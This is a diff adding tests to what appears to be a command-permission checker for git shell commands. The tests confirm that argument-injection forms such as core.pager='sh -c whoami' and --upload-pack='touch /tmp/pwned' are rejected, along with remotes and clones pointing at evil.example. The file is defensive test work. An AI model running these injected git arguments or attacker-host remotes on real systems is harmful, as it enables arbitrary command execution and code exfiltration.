@@ -66,6 +66,17 @@ test("shell: git config / credential / remote 拒絕", () => {
   rejected(decide(shell("git remote set-url origin https://evil.example/x.git")));
 });
 
+test("shell: 能讓 git 執行任意指令的參數 (-c / --upload-pack / --exec) 拒絕", () => {
+  rejected(decide(shell("git -c core.pager='sh -c whoami' diff")));
+  rejected(decide(shell("git --config-env=core.pager=X diff")));
+  rejected(decide(shell("git clone --upload-pack='touch /tmp/pwned' https://github.com/o/r.git", {
+    possibleUrls: ["https://github.com/o/r.git"],
+  })));
+  rejected(decide(shell("git clone -u 'touch /tmp/pwned' https://github.com/o/r.git", {
+    possibleUrls: ["https://github.com/o/r.git"],
+  })));
+});
+
 test("shell: 從 GitHub 以外的地方 clone 拒絕", () => {
   rejected(decide(shell("git clone https://evil.example/x.git", { possibleUrls: ["https://evil.example/x.git"] })));
 });
